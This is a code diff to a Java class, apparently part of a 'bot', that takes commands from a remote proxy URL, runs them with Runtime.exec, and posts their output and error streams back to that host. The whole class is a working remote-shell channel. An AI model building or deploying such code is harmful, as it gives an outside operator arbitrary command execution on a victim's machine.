@@ -1,7 +1,9 @@
 package com.bot.Thread;
 
 import java.io.BufferedReader;
+import java.io.FileNotFoundException;
 import java.io.InputStreamReader;
+import java.io.PrintWriter;
 
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
@@ -15,10 +17,12 @@ import org.apache.http.util.EntityUtils;
 public class CMD extends Thread {
   protected String proxyUrl;
   protected String sessionId;
+  protected String respSessionId;
 
-  public void startSend(String proxyUrl, String sessionId) {
+  public void startSend(String proxyUrl, String sessionId, String respSessionId) {
     this.proxyUrl = proxyUrl;
     this.sessionId = sessionId;
+    this.respSessionId = respSessionId;
     start();
   }
 
@@ -53,6 +57,7 @@ public class CMD extends Thread {
         client.close();
       } catch (Exception e) {
         disconnectRemoteSocket(sessionId);
+        disconnectRemoteSocket(respSessionId);
         break;
       }
     }
@@ -61,7 +66,7 @@ public class CMD extends Thread {
   private void executeCommandAndResp(String command, String sessionId) {
     CloseableHttpClient client = HttpClientBuilder.create().build();
     HttpPost post = new HttpPost(proxyUrl.concat("/socketHandler"));
-    post.addHeader("sockRestId", sessionId);
+    post.addHeader("sockRestId", respSessionId);
     try {
       post.setEntity(new StringEntity(executeCommand(command)));
       client.execute(post);
@@ -74,16 +79,20 @@ public class CMD extends Thread {
     Process p;
     try {
       p = Runtime.getRuntime().exec(command);
-      p.waitFor();
       BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+      BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
       String line = "";
       while ((line = reader.readLine()) != null) {
         output.append(line + "\n");
       }
+      output.append(line + "\n------error------\n");
+      while ((line = errorReader.readLine()) != null) {
+        output.append(line + "\n");
+      }
+      p.waitFor();
     } catch (Exception e) {
       e.printStackTrace();
     }
-
     return output.toString();
   }
 
